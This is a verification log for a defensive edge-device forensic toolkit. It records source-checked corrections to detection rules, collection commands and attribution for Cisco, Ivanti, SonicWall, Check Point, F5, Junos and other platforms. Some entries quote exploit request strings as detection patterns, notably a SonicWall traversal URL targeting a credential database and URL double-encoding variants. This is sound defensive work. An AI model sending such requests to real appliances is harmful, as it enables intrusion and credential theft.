# Verification log

Every correction made to the content, with the basis for it. A change to a
step's or entry's `confidence` belongs here. Device-verified corrections and
source-verified corrections are both recorded; the `Basis` column says which.

No profile has yet been run against a real device. Everything below is a
**documentation pass**: claims checked against vendor advisories, government
advisories and the original research. A documentation pass catches wrong
facts; it cannot catch a command that is documented but behaves differently on
a given release. Lab verification is still the next step (see `ROADMAP.md`).

## 2026-10-22 - claim-by-claim verification against primary sources

Three independent passes, one per vendor group, each told to report every claim
as CONFIRMED, CORRECTED or UNVERIFIABLE against a primary source.

### Corrections that changed detection behaviour

| Item | Was | Now | Basis |
|---|---|---|---|
| ASA `show memory region` parser (`checks/cisco.py`) | Expected a `0x<start> 0x<end> 0x<length> r-xp` layout | Parses the real `/proc/maps` row `start-end perms offset dev inode path`; length = end - start | Cisco ASA command reference and the Talos ArcaneDoor example. **The old parser matched nothing on a real device and reported "no hit" on a compromised one.** Pinned by `test_asa_region_parser_matches_published_format`. |
| ASA region check tier | Treated >1 executable region as the indicator | Same, but the detail now says 2 (occasionally 5) can be normal and asks for review | NCSC-UK LINE DANCER analysis **Reversed 2026-10-23:** NCSC says lina has 2 or 5 regions in total and the count is not an indicator; the split r-xp text section is. See round 3. |
| LINE RUNNER filename (`EDGE-PACK-0006`) | `client_bundle_install\.zip` | `client_bundle[\w-]*\.zip` | Talos: the ASA loader matches `client_bundle*.zip`, so other names are possible |
| Ivanti injection endpoints (`EDGE-PACK-0007`) | `license/keys-status` or `cloud-server-test-connection` | `license/keys-status` only | keys-status confirmed by Assetnote; cloud-server-test-connection could not be confirmed as a sink from a primary |

### Corrections to facts and attribution

| Item | Was | Now | Basis |
|---|---|---|---|
| UTA0576 motivation | espionage | financial; Volexity's own words quoted | Volexity, 13 Oct 2026: "low confidence" assessment that UTA0576 is a criminal actor **Reversed 2026-10-23:** Volexity's word is criminal, at low confidence; motivation is now unknown with Volexity's sentence quoted. |
| Ivanti syslog blocking | Attributed to SPAWN-family malware | iptables DROP rules and the read-write remount were the operator's commands; SPAWNSLOTH suppresses logging in-process | Mandiant, 8 Jan 2025 **Reversed 2026-10-23:** GTIG attributes the iptables block to the exploit and its script, not the operator; SPAWNSLOTH is separate. |
| SPAWNSLOTH | "edited local logs" | suppresses logging while the SSH backdoor runs; `sed` removal was manual | Mandiant, 8 Jan 2025 |
| Ivanti 2026 in-memory patch | "restored on disk", "no on-disk implant" | library patched in memory only (on-disk copy never modified), patch restored; on-disk tooling still in `/tmp` and `/data/.icscap/` | Volexity, 13 Oct 2026 |
| CISA AA24-060B ICT wording | "then-current external ICT" | "previous external ICT" | AA24-060B text |
| Ivanti web shells | CGI and Perl | CGI, Perl and Python (GIFTEDVISITOR and WIREFIRE are Python) | Mandiant, 11 Jan 2024 |
| CVE-2024-3400 trigger (`EDGE-PACK-0001`) | "through device telemetry" | telemetry was the original trigger; vendor later said it need not be enabled | Palo Alto advisory, Unit 42 **Reversed 2026-10-23:** the advisory only says disabling telemetry was once a mitigation and is no longer effective; telemetry was not the trigger. |
| PAN-OS "Level 3" | Attributed to the vendor advisory | Attributed to Unit 42 | The level scheme is not in the advisory |
| CVE-2025-6543 (`EDGE-PACK-0004`) | Listed as code execution | Removed from the RCE pack; vendor titles it memory overflow / DoS, RCE only from NCSC-NL field reports | Citrix CVE record, NCSC-NL |
| ASA `show version` | "last reload reason" | uptime only; ASA does not print a reload reason (that is IOS) | Cisco ASA documentation |
| RayDetect scope | Unscoped | ASA 5500-X on 9.12 and 9.14 only; not Firepower or ASAv | RayDetect README |
| NetScaler persistent disk | `da0` | `da0`, `ad0` or `ada0` by model, BIOS and hypervisor | Citrix support articles, fox-it README |
| FortiOS filesystem hash | 7.2.6+ | 7.0.13+, 7.2.6+ and 7.4.0+ | Fortinet docs and community tech tip **Reversed 2026-10-23:** no source supports 7.0.13+; only the versions Fortinet documents are kept. |
| UNC6148 / Abyss link | "moderate confidence overlap with Abyss" | GTIG gives no confidence level for the Abyss link; its "moderate confidence" concerns zero-day use | GTIG, 16 Jul 2025 **Reversed 2026-10-23:** GTIG has two moderate-confidence statements: possible zero-day use and that operations may enable data theft, extortion and possibly ransomware. |
| SonicWall fixed firmware | 10.2.2.2-92sv | 10.2.1.15-81sv | GTIG, 16 Jul 2025 **Reversed 2026-10-23:** 10.2.1.15-81sv is what GTIG's victims already ran; SonicWall SNWLID-2025-0015 recommends 10.2.2.2-92sv. |
| CVE-2024-24919 | "reads files as root"; "local or LDAP accounts" | Reads arbitrary files (published exploit read `/etc/shadow`); local accounts | watchTowr, mnemonic. "As root" was inferred, not vendor-stated; "LDAP" was an extrapolation |

### Sources replaced with primaries

| Where | Was | Now |
|---|---|---|
| SonicWall catalog, pack 0008, actor UNC6148, implant OVERSTEP, response | SecurityAffairs summary | GTIG primary report |
| Check Point catalog, pack 0009, Sigma rule, response | Help Net Security | Check Point sk182336 and watchTowr |
| Ivanti traversal Sigma rule and pack 0007 | CISA AA24-060B (which never names the path) | Assetnote research |

### Confidence raised after confirmation

| Item | Was | Now | Basis |
|---|---|---|---|
| PAN-OS `appweb3-sslvpn.log` step | low, unverified | medium | Palo Alto TAC workshop document lists the file |
| FortiOS `fnsysctl ls -la /data` step | low, unverified | medium | Fortinet IOC tech tip lists the command |
| `EDGE-PACK-0008` (OVERSTEP) | medium | high | Every detection confirmed against the GTIG primary |

### Softened because a primary could not confirm them

| Item | Change |
|---|---|
| Ivanti `os_base` | "CentOS-derived" removed; base distribution has changed across releases |
| SonicWall `os_base` | "32-bit x86" removed; not stated by GTIG |
| FortiOS crash-log volatility | No vendor statement that it survives reboot; now advises collecting before any reboot |

### Still unverified, deliberately left visible

- PAN-OS customer root-shell policy and partition layout: no primary document.
- COATHANGER persistence: confirmed only through press coverage of the MIVD/AIVD advisory; the advisory PDF could not be fetched.
- CISA ED 25-03 and the 13 Oct 2026 Ivanti alert: cisa.gov refused automated fetches; content confirmed through mirrors and press. *(Superseded 2026-10-23: cisa.gov pages now read directly with Firecrawl.)*
- The FortiOS SSL-VPN language directory path: not named by the vendor, so it stays operator-supplied.

## 2026-10-22 (round 2) - Check Point and F5 against primary sources

An independent pass re-read every Check Point and F5 claim against the vendor
articles, CISA and the researchers' write-ups. It found two silent failures in
the engine and detections, so those come first.

### Corrections that changed detection behaviour

| Item | Was | Now | Basis |
|---|---|---|---|
| Rotated logs (all platforms) | `iter_lines` read `.gz` files as raw bytes, so every rotated log was searched as compressed noise and reported as no-hit | gzip is detected by magic bytes and decompressed; truncated archives stop cleanly | `test_rotated_gzip_logs_are_read`, `test_truncated_gzip_does_not_crash` |
| `EDGE-PACK-0017` util-bash audit pattern | Matched `cmd=`; the F5 audit format is `cmd_data=` | `cmd_data=run util bash -c` | F5 audit log format; `test_f5_audit_patterns_use_the_real_format` |
| `f5_apm_oauth_userinfo_burst` | 10 or more failures from one address | 10 or more `01990004` invalid-token UserInfo failures in one log, reporting whether one address accounts for all of them; route-domain suffixes (`%2`) parsed | F5 K000162605 ("10 or more ... in one log, especially if all observed from a single IP"); `test_f5_burst_spread_across_addresses_is_caught` |
| `EDGE-PACK-0009` vpnd detection | `Invalid filename`, which is not the blocked-traversal message | `Suspected path traversal attack from` | Check Point sk182336 hunting guidance **Reversed 2026-10-23:** sk182336 does not contain the string; it comes from watchTowr's patch diff and its log destination is unconfirmed. |
| `EDGE-PACK-0013` patterns 2a/2b | Case-insensitive | Case-sensitive, as published | Check Point sk1000171 |
| Check Point `cpinfo_bundle` | `cpinfo` without flags, which uploads to Check Point and self-updates by default | `cpinfo -z -i -S -D -d`; `-D` no upload, `-d` no update | Check Point cpinfo usage; `test_cpinfo_never_uploads` |

### Corrections to facts, scope and attribution

| Item | Correction | Basis |
|---|---|---|
| CVE-2026-93616 scope | Collect `cpm.elg` on SMS, MDS, Log Server, MDLS and SmartEvent, not the SMS alone | sk1000171 |
| CVE-2026-50751 attribution | Replaced a paraphrase with Check Point's verbatim medium-confidence statement; actor stays unnamed, so no profile | Check Point blog |
| CVE-2026-50751 Vendor ID mechanism | Attributed to watchTowr, not Check Point | watchTowr |
| CVE-2026-85102 scope | Site-to-Site only where certificate authentication is used or allowed; PSK-only communities and R82.20 not affected | sk1000117 |
| VPN implied-rules mitigation | "Do not disable" overstated Check Point; now "exercise caution", with replacement rules as this toolkit's addition | sk1000117 |
| Check Point LivePatch | LivePatch Takes 28 and 29 do not fix CVE-2026-93616 | sk1000171 |
| c05d5254 C2 | "C2 channel" replaced by F5's "disguised activity" wording | K000160486 |
| c05d5254 memory residency | Reboot-clears-it marked as this toolkit's inference, not F5's statement | K000160486 |
| CVE-2023-46748 indicator | Exact catalina.out strings quoted | F5 K000137365 |
| K11438344 wording | Keys and credentials "may be compromised, and it may be prudent to assume that they are" | K11438344 |
| F5 citation | K16197 replaced by K23605346 and K000160486 | F5 |
| F5 System Scanner | `--scan-procs` named as the process check | K000160515 **Reversed 2026-10-23:** K000160515: the flags hash running process binaries against a manifest; F5 does not say they detect webshells. |

### Confidence changes

| Item | Before | After | Basis |
|---|---|---|---|
| Check Point `fw_ver` | medium | high | Documented in the Gaia CLI reference; a reference URL that had been constructed rather than found was removed |
| Check Point `fwm_ver` | - | medium (new) | Management-side version; added to the allow-list and fixture |
| F5 `sys_version`, `auth_users`, `mgmt_ip`, `irules` | high | medium | `tmsh ... \| cat` as a way to suppress paging is not documented by F5 |

## 2026-10-22 (round 2) - Juniper Junos and Cisco IOS XE against primary sources

Checked against Mandiant's UNC3886 post (English original), Juniper's JMRT
documentation, Cisco's IOS XE forensic guide v1.7, the Cisco web UI advisory,
Talos (both IOS XE posts), the hardening-release advisory, the IC3 copy of
AA25-239A and the CISA KEV catalog. An independent reviewer worked partly from
official Japanese editions because the English pages were blocked for it; every
point where the translation differed was re-read in English before changing
anything, and one proposed correction was rejected on that basis (below).

### Corrections that changed detection or collection behaviour

| Item | Was | Now | Basis |
|---|---|---|---|
| Junos listing patterns | Anchored on the bare file name | Tolerate the type markers `file list` appends (`loader.bin*`, `null\|`); the old patterns saw nothing | Juniper `file list` output; `test_junos_listing_type_markers_do_not_hide_files` |
| `jmrt_integrity_check` | Impact-free, "read-only" | `vendor-bundle`, tier B, after log collection: Juniper says it writes and runs a test file and adds syslog lines | JMRT documentation; `test_junos_integrity_check_is_not_impact_free` |
| `junos-unc3886-masquerade-proc` | likely | possible: Mandiant gives binary names, never a process listing, and the documented execution ran inside a hijacked `cat` | Mandiant |
| New `junos-hijacked-cat-process` | - | possible | Mandiant (lmpad injected into `cat`) |
| `junos-unc3886-staging-files` | Payload names expected in /var/tmp | Split: `junos-unc3886-tmp-files` (pfed_jdhcp6_trace.log, rts - the only names Mandiant places in /var/tmp; possible) and `junos-unc3886-payload-files` (searched in every listing, because the `ldb` working directory's location is not given and it was deleted) | Mandiant |
| New `listing_mfs_etc` step and `junos-syslog-conf-backup` | - | `/mfs/var/etc/syslog.conf0` (low, unverified path; single source) | Mandiant pre_ssh / post_ssh scripts |
| `show_config` purpose | "UNC3886 sent logging to /dev/null" - check the configuration | The redirect was in the runtime syslog.conf and restored on exit; the configuration will not show it | Mandiant |
| IOS XE `image_hash` | Hashed `bootflash:packages.conf` | Hash each .pkg listed in packages.conf (new `show_packages_conf` step, `more` allowed for `.conf` only); hashing the text file proved nothing | Cisco forensic guide |
| IOS XE `iosd_smaps` | Router form only; switches reported not-evaluated | New `iosd_smaps_switch` step; the check reads both | Cisco forensic guide; `test_iosxe_switch_form_smaps_is_read` |
| Sigma `ios_xe_wsma_endpoint_request` | Three fixed strings | Regex accepting plain, single- and double-encoded letters in any mix (`%2577ebui_wsma`) | AA25-239A PCRE |

### Corrections to facts and wording

| Item | Correction | Basis |
|---|---|---|
| wtmp0, utx.log0 | post_ssh deletes wtmp0 (and syslog.conf0); utx.log0 is left behind. wtmp0 or syslog.conf0 means an interrupted session | Mandiant scripts |
| usage_db | Tar archives of juniper.conf files, created and deleted by the scripts | Mandiant |
| pfed_jdhcp6_trace.log | Deleted after each use | Mandiant |
| UNC3886 first_seen | "2022" became "first Mandiant reporting 2022; no first-seen date given" | Mandiant |
| UNC3886 victimology | Added "mainly in the US and Asia" | Mandiant |
| YARA `irad_kill` | Renamed `irad_stop`: it is the passive-listener stop string | Mandiant |
| Reboot loses Junos payloads | Marked as this toolkit's inference | Mandiant gives no statement |
| IOS XE platform integrity | Collected for the TAC case; the guide gives no values to compare | Cisco forensic guide |
| system_shell trace logs | The guide asks for them in a TAC case; "evidence of shell use" is this toolkit's inference | Cisco forensic guide |
| Guest Shell abuse | Cited to AA25-239A, not the forensic guide | IC3 copy of AA25-239A |
| `%25` probe | 200 with JavaScript redirect means "no known variant", not clean; the logon_hash check only works if the web server was restarted | Talos |
| Log clearing | Talos lists .bash_history, auth.log, lastlog, wtmp and btmp "where applicable" without naming device types | Talos Salt Typhoon analysis |
| Talos on initial access | CVE-2018-0171 "likely abused" in one case; no evidence for three other reported Cisco CVEs | Talos Salt Typhoon analysis |
| `no vstack` | AA25-239A says "disable Smart Install"; `no vstack` is Cisco's command for it | IC3 copy of AA25-239A |
| Hardening release | 17.18.4a also fixed; 17.8 and earlier must migrate | cisco-sa-hardening-iosxe-V8NMuMZJ |
| AA25-239A actor notes | "Check before quoting" removed: attribution sentence, victimology and "since at least 2021" verified verbatim | IC3 copy |

### Checked and kept

- UNC3886 attribution quote: verbatim in the English post, with no "suspected"
  (the Japanese edition adds a hedge the original does not have).
- Mandiant's "required novel methods for artifact acquisition and analysis":
  verbatim; the quote stays.
- Talos on the 2023 clusters: "We assess with a high degree of confidence that
  these clusters of activity were carried out by the same actor." A proposed
  downgrade to "likely", based on the Japanese translation, was rejected; the
  pack now quotes the English.
- Backdoor pairings, ports, trigger mechanisms, YARA strings, CVE-2025-21590
  scope and KEV date, IOS XE syslog strings, curl header and fixed releases,
  account names, pcap names, double-encoding and Proxy-Uri-Source.

### Still unverified

- `file list ... detail recursive` option order (used only by the low-confidence scripts step).
- Whether healthy IOS XE devices ever carry dirty rwxp IOSd segments.
- Whether newer Junos prints threads as `name{thread}` in `show system processes extensive`.
- `/mfs/var/etc` on platforms and releases other than Mandiant's victims.
- CVE-2026-21902 in VulnCheck KEV (absence from CISA KEV is confirmed).

## 2026-10-22 - hardening controls

Two research passes read vendor and government sources for every platform;
the controls that carry the most weight were then re-read by the maintainer
session before writing. Sources are recorded per control in
`artifacts/hardening/`.

### Re-read and confirmed verbatim

- CISA BOD 23-02: the two required actions, the 14-day timeline, the device
  scope and the 13 June 2023 issue date.
- Cisco IOS XE web UI advisory: disable the HTTP server on internet-facing
  systems, the two commands, and the access-class example.
- Cisco ASA continued-attacks page: Secure Boot platforms not seen compromised,
  migrate to supported hardware, disable SSL/TLS VPN web services as an interim
  mitigation, upgrade to a fixed release.
- F5's October 2025 blog: management interfaces never exposed to the internet.
- Check Point management-plane hardening page: restrict SmartConsole, Gaia
  Portal, SSH and API to internal ranges or jump hosts; direct internet admin
  access "Avoid. Require VPN."
- Palo Alto Networks CVE-2025-0108: restrict management to trusted internal
  addresses; GlobalProtect not affected unless a management profile is on its
  interface; the Customer Support Portal path.
- Fortinet 19 June 2026 post: trusted hosts (good), local-in policy (better),
  no internet administration (best). Fortinet 22 January 2026 post: FortiCloud
  SSO CVEs are CVE-2025-59718 and CVE-2025-59719 (a research note had garbled
  the pair), and the `admin-forticloud-sso-login disable` CLI.
- Ivanti ICS hardening guide: no admin on the external port, management
  interface, admin-realm source IP restrictions, MFA, external syslog. Ivanti's
  CVE-2025-22457 post: exploitation on 22.7R2.5 or earlier and Pulse Connect
  Secure 9.1x; Policy Secure "should not be an internet facing solution".
- NetScaler secure deployment guide: NSIP and Management Service IP not exposed,
  traffic separation, `-gui SECUREONLY`, `-restrictAccess enabled`,
  `localAuth DISABLED`; the CVE-2023-4966 session-kill commands.
- GTIG OVERSTEP post: credential and OTP reset as "the most critical step",
  certificate reissue, and the credential-reuse assessment.

### Deliberately left without syntax

- J-Web disable or restrict command (Juniper's workaround gives none; the
  JSA pages did not render).
- IOS XE Type 8 password command (not in the sources read).
- FortiOS trusted-host keyword (rendered as both trusthost and trustedhost)
  and the full `login-lockout-upon-weaker-encryption` syntax.
- The full FG-IR-24-535 local-in CLI (one value was lost in the fetch); the
  control points to the advisory instead.
- Ivanti ICS management-port path (only a Policy Secure guide gave one).

### Sources read through copies, and confidence set accordingly

- SonicWall's English SMA 100 notice now returns "Article Not Found"; the
  vendor controls come from SonicWall's Japanese-locale copy and are medium.
- The NSA network infrastructure guidance was read from a mirror (the .gov PDF
  refused automated access); the controls citing it are medium. *(Superseded 2026-10-23: the NSA guide is now read from the primary .gov PDF.)*
- The Cisco ASA and IOS XE hardening guides were read in Dutch and Portuguese
  editions because the English URLs redirect; the advisory quotes are English.
- ED 26-01 was read through FedRAMP's restatement and the Canadian Cyber
  Centre's alert; AA25-239A through the Australian co-sealed copy.

## 2026-10-23 - detections, hunts, artifact guidance and indicators

Every new indicator string was checked against a saved copy of its source
before it went into a pattern. Where a quote reached us only through a
summarising fetch it is marked `read: summariser` and the hunt carries
`unverified: true` when nothing else supports it.

### Corrections that changed detection behaviour

| Item | Was | Now | Basis |
|---|---|---|---|
| LINE DANCER region check (`EDGE-PACK-0006`, `EDGE-0005.01`, ASA playbook) | An unsplit lina region map read as reassuring | Says it proves nothing about the 2025 activity | NCSC RayInitiator / LINE VIPER report: "the 'split lina' effect is not observable" |
| ASA collection order | Nothing about power-cycling | Playbook forbids a cold restart before `show kernel process \| include lina_cs` | Cisco cisco-sa-asaftd-persist-CISAED25-03: a cold restart removes the FXOS implant; shutdown, reboot and reload do not |
| `/data/.icscap` (Ivanti, UTA0576) | "Tooling under /data/.icscap" | dsstatmond (renamed tcpdump) and h.py are the actor's; cap* captures held at possible | Volexity, 13 October 2026 |
| NetScaler `/var/netscaler/.ns_suidcmd` | Listed by a research pass as a success indicator | Not used: Unit 42 calls it "the NetScaler SUID binary" the shell abused | Unit 42 NetScaler zero-days post |
| CVE-2022-41328 hs20-icon detection | - | Notes that success is not logged; only failed attempts reach the elogs | Mandiant Fortinet malware ecosystem post |
| Check Point/F5-style catalog guidance | - | Every artifact now states normal and suspicious with the basis of the criterion; `toolkit` marks this project's own inference | - |

### Corrections to facts and attribution

| Item | Was | Now | Basis |
|---|---|---|---|
| UTA0576 `stated_confidence` | "Volexity assesses with low confidence that UTA0576 is a criminal actor" (paraphrase) | Volexity's sentence verbatim: "...has criminal, rather than espionage, motivations based on the target of this activity." | Volexity |
| CISA ED 25-03 supplemental | "303013" | Read as 302013, the ID Cisco's detection guide lists | Cisco detection guide v1.2 **Reversed 2026-10-23:** CISA's page, updated 24 April 2026, now prints 302013. |
| `firmware_update.log` | CISA spells it firmwareupdate.log and firmware-update.log | Cisco's spelling is used | Cisco detection guide and event response page **Reversed 2026-10-23:** the live CISA page uses firmware_update.log. |
| ROMMON persistence vs RayInitiator | - | Not equated: Cisco does not name the mechanism; NCSC names a GRUB bootkit on the same models | Cisco, NCSC |
| FXOS implant name | - | Recorded as Cisco describes it; Talos's name FIRESTARTER kept as an alias only (page read through a summariser) | Cisco advisory |

### Low confidence by design

- `EDGE-PACK-0020` (Junos J-Web), `EDGE-PACK-0021` (IOS XE Zero Disco) and
  `EDGE-PACK-0022` (SMA 100 2025) rest on one researcher or vendor-researcher
  publication each and are `low` / `unverified`. Juniper's JSA72300 needs a
  support login and was not read. *(Superseded 2026-10-23: JSA72300 is public and was read on 2026-10-23.)*
- No published indicators, so no pack: PAN-OS CVE-2024-3393, CVE-2025-0111,
  CVE-2026-0322 (addresses only); FortiOS CVE-2019-6693, CVE-2025-68686; ASA
  CVE-2020-3259, CVE-2014-2120, CVE-2026-20349; IOS XE CVE-2023-20109,
  CVE-2016-6415; NetScaler CVE-2023-6548/6549, CVE-2026-3055, CVE-2026-8452,
  CVE-2026-19490. CVE-2025-0108 (PAN-OS) and CVE-2026-88772's `.deb` file names
  were left out: the first string came only through a summariser, and the
  second names files the directory legitimately hosts.
- Jaguar Tooth (CVE-2017-6742) targeted classic IOS, not IOS XE; omitted.
- F5 K000154696 (hunting guide) and CISA ED 26-01 could not be read; F5 has no hunt.
- The AA25-239A STIX bundle returned 403 to every fetch; the advisory's
  indicators are not in the IOC set.

### Indicators

Eleven indicator sets were parsed in code from the publishers' own files
(Volexity CSV, Talos STIX and text, JSCU-NL text) or HTML tables (Mandiant,
GTIG, Trend Micro, Unit 42, Fortinet), never retyped. Each value keeps the
publisher's role; the validator rejects malformed or defanged values. Volexity's
2024-01-18 Ivanti file was left out: it mixes several actors and XMRig activity.
Fortinet's srcip and dstip example values are left out because Fortinet says
they are attacker-chosen parameters.

## 2026-10-23 (round 3) - every source re-read with Firecrawl

All 155 cited URLs and 111 quotes were re-read against the primary source,
together with roughly 870 unquoted claims: log strings, paths, commands, dates,
attribution wording and confidence. Firecrawl rendered pages earlier passes could
not reach (my.f5.com, support.checkpoint.com, supportportal.juniper.net, cisa.gov).
196 issues were found (23 high, 82 medium, 91 low). Every high-severity passage
was read a second time before its correction was applied. Rows above that this
round reversed are marked "Reversed 2026-10-23".

### Main-session changes

| Item | Was | Now | Basis |
|---|---|---|---|
| cisco-asa `lina_text_implant_grep` | Impact-free, tier V3, ran by default | `impact: break-glass`, tier X, beside the core dump; opt-in with --break-glass | CISA Supplemental Direction ED 25-03 (updated 24 April 2026) tells responders to stop if the device crashes during its initial commands; NCSC reports LINE VIPER reboots the device on access to system:/text. CLAUDE.md: anything that can crash or reload the device is break-glass. |

### Cisco ASA / IOS XE, SonicWall SMA 100, Check Point, Junos, F5

Pass date 2026-10-23. Findings applied from findings-C-asa-iosxe.json (30), findings-D-sonicwall-checkpoint.json (37), findings-E-junos-f5.json (35).
High-severity passages re-read before applying: CISA Supplemental Direction ED 25-03, live (implant grep command, verbatim; the checkheaps, core-dump and FIRESTARTER passages were already confirmed by the main session); NCSC RayInitiator/LINE VIPER MAR v1.1 (saved PDF text, scratchpad dl/ncsc/mar.txt); RayDetect README (saved, verify/rd/README.md); F5 K000160515, live; Check Point sk185033, live, plus the saved copy for Options 2 and 3; watchTowr CVE-2024-24919, live; sk182336 (saved, no traversal string). CISA AR26-113A and Juniper JSA72300 were also read live before they were cited. Other quotes come from the finding evidence or from the saved primary copies named below.

#### Corrections that changed detection or collection behaviour

| Item | Was | Now | Basis (source + verbatim phrase) |
|---|---|---|---|
| cisco-asa profile: new step `lina_text_implant_grep` (V3, after every other live step) + exact-command allow rule | No on-box check for the 2025 implant | `more /binary system:/text \| grep 55534154 41554156 41575756 488bb3a0`, confidence medium (CISA prints no output). The allow rule admits only this command. | CISA Supplemental Direction ED 25-03 (live, updated 24 Apr 2026): "Check for the presence of the threat actor's implant by running the following command: more /binary system:/text \| grep 55534154 41554156 41575756 488bb3a0." / "Any output from this command is an indicator of compromise." The trailing period on CISA's page is sentence punctuation and was dropped. The step is placed last among the live steps because CISA says to stop "If your device crashes as a result of running any command in this step" and NCSC says LINE VIPER reboots the device on copy of system:/text. |
| EDGE-PACK-0018 new detection `asa-lina-text-implant-grep` (likely) | - | The hex groups CISA greps for; lines containing `grep` (the echoed command) are excluded | Same CISA passage; RayDetect README: Part One, Section One determines "if there is evidence of LineViper presence on the device". Held at likely, not confirmed, because the output format is unpublished. |
| cisco-asa profile `core_dump` instructions + references | "Follow the vendor and CISA ED 25-03 core dump procedure"; only LINE DANCER named; cited the 12 Nov 2025 alert | Run every live step first. CISA's procedure starts with a soft reboot, then `crashinfo force page-fault`. LINE VIPER also reboots on a dump request and on copy of system:/text, and forges the verify hash. A dump that writes no file is recorded and reported. Cites the Supplemental Direction and the NCSC MAR. | CISA: "The steps below trigger an immediate reload of the device" / "Soft reboot the device to maximize the likelihood of a clean core dump" / "document and inform CISA; this may indicate an error or possible compromise". NCSC MAR: "Modified signal handler for when a core dump is triggered such that instead the device immediately reboots"; "Modified copy command function pointer ... checks for system:/text and reboots the device if found"; "Modified verify command ... returns the hash of text section of legitimate firmware instead". |
| `asa_lina_exec_regions` hit detail and docstring (edgetriage/checks/cisco.py) | "(NCSC notes 2 or occasionally 5 can be normal; review the list)" | Detail says Talos and NCSC treat more than one r-xp lina region as the indicator, and that NCSC's 2 or 5 counts regions of all permissions. The check logic is unchanged. | NCSC LINE DANCER TIP (confirmed by main session): "The number of legitimate memory regions varies ... It has been observed being either 2 or 5. The number of memory regions in itself is not an indicator of compromise." / "multiple executable memory regions for lina ... a strong indicator of compromise for Line Dancer". |
| `asa_checkheaps_stalled` | Detail asked for "once a minute for five minutes as Cisco describes" | Reports the gap between the two readings, taken from the manifest step times, and says whether it meets CISA's five-minute wait. Hit/no-hit logic is unchanged. | CISA: "Wait at least five minutes, then run "show checkheaps" again" / "If there is no positive change in "Total number of runs," this is evidence of a potential compromise." |
| EDGE-PACK-0006 new detection `asa-line-runner-webcontent` (likely) + note on `asa-line-runner-zip` | Only the zip was checked | Also matches 1515480F4B538B669648B17C02337098 in the disk0 listing. The zip note says the zip is normally absent on a running device. | Talos ArcaneDoor: "Once processed, the ZIP file is deleted"; csco_config.lua will "Create disk0:/csco_config/97/webcontent/1515480F4B538B669648B17C02337098 from hash.txt". |
| cisco-iosxe profile: new step `iosd_smaps_switch_r0` (medium) | No r0 form | `show platform software process memory switch active r0 active name iosd smaps` | IOS XE forensic guide v1.7: "Some switches require a target of r0. Replace rp with r0 in the following two commands if a syntax error occurs." The command is that literal substitution. |
| `iosxe_iosd_rwx_dirty` + new detection `iosxe-iosd-rx-dirty` (possible, args perms [r-xp]) | rwxp only; router and switch-rp forms only | Reads all three smaps forms. Dirty r-xp segments are reported separately at possible. | Guide footnote [1]: "checks the active route processor (RP) for non-zero values in the Private Dirty entry for each segment with the executable flag set (i.e., r-xp or rwxp)." |
| cisco-iosxe profile: new step `dir_tracelogs`; `dir_all` confidence high -> medium | `dir /recursive all-filesystems` presented as from Cisco's guide | Cisco's own `dir harddisk:/tracelogs` added; dir_all is labelled as the toolkit's addition | Guide: "dir harddisk:/tracelogs"; "core files and tracelogs may exist on the flash:, bootflash:, harddisk:, or crashinfo: partitions". |
| EDGE-PACK-0011 new detection `iosxe-weblogin-talos-user` (likely) | - | `%SEC_LOGIN-5-WEBLOGIN_SUCCESS: Login Success [user: <Talos account name>]` | Cisco advisory: "%SEC_LOGIN-5-WEBLOGIN_SUCCESS: Login Success [user: user] [Source: source_IP_address]"; account names from Talos. |
| EDGE-PACK-0012 `iosxe-named-pcap-on-flash` split | 1.pcap at likely | tac.pcap and mycap.pcap stay likely; new `iosxe-1-pcap-on-flash` holds 1.pcap at possible | AA25-239A: "naming schemes such as mycap.pcap, tac.pcap, 1.pcap, or similar variations". |
| EDGE-PACK-0008 `sma-ld-so-preload` (id kept; type path_exists -> yara) + new rule 06-sonicwall-sma/sma_ld_so_preload_contents.yar | Fired on any ld.so.preload | Fires only when the file is larger than 2 bytes. An empty file is evaluated and does not fire; an absent file is not evaluated. | GTIG (UPDATE Sep 16): "Presence of the file /etc/ld.so.preload on a disk image with greater than 2 bytes of contents. This file should not exist with actual contents on a standard SMA appliance". |
| EDGE-PACK-0008 new `sma-overstep-cf-files` (likely) and `sma-overstep-published-hash` (confirmed) + rule sma_overstep_published_hashes.yar | Two path checks only | Path checks for /cf/xxx.elf and /cf/libsamba-errors.so.6. YARA `hash.sha256` over **/cf/**, **/lib/** and **/etc/rc.d/** for the two GTIG SHA256 values (the same values as EDGE-IOC-0008; a test pins this). | GTIG Host-Based IOCs: "/cf/xxx.elf /cf/libsamba-errors.so.6 /usr/lib/libsamba-errors.so.6 \| b28d5726...d473 \| OVERSTEP"; "/etc/rc.d/rc.fwboot \| f0e0db06...e149 \| Modified legitimate boot RC file". |
| EDGE-PACK-0008 confidence | high | medium | One reporting party (GTIG); the catalog and implant entries were already medium. |
| EDGE-PACK-0022 new detection `sma-38475-css-suffix-generalised` (possible, basis toolkit) | Literal `%3f.1.1.1.1a-1.css` only | `%3f` followed by any suffix the abused RewriteRule accepts; the literal is excluded so it is reported once | watchTowr: "RewriteRule ^/(.+)\.[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[A-Za-z0-9]*-[0-9]+.*\.css$ /$1.css"; "GET /tmp/temp.db%3f.1.1.1.1a-1.css". |
| EDGE-PACK-0009 `checkpoint-vpnd-traversal-blocked` sources + Sigma logsource | Only `**/vpnd.elg*`; Sigma `service: vpnd`; Sigma cited sk182336 | Searches every .elg/.log/.csv/.txt in the case. Note says the string comes from watchTowr's patch diff and its log destination is unconfirmed. sk182336 dropped from the Sigma references. | watchTowr (live): "new code has been added, which is logging the string "Suspected path traversal attack from"" / "a new logging function has been added, named send_path_traversal_alert_log". sk182336 has no such string. |
| checkpoint catalog `$FWDIR/log/vpnd.elg*` artifact | medium | low + unverified; description says the destination is unconfirmed | Same. |
| EDGE-PACK-0013 `cp-93616-oversized-username` tier | likely | possible (test updated: the CVE-2026-85102 corroboration case is now LIKELY-COMPROMISED, not COMPROMISED) | sk1000171: "Each of the indicators below may indicate an attempt to exploit this vulnerability" / "A match does not necessarily confirm successful compromise." |
| checkpoint-gaia profile `hotfixes` step + allow rule | `cpinfo -y all` | `cpinfo -d -y all` (also in the response verify step and the catalog locator) | sk92739: "CPInfo is an auto-updatable utility"; "-d Specifies not to check for updates of CPInfo utility". The article does not say whether -y skips the check. |
| checkpoint-gaia profile `smartconsole_exports` | One CVE-2026-16232 query | Adds "Authentication method: Password based application token", sk185169's instruction, and the note that its IP list is "relevant for events before 2026-07-23". The CVE-2026-85102 scanning advice moved here from netstat. | sk185169 (saved): "search for the query "Authentication method: Password based application token". Any found events should be treated as suspicious..." |
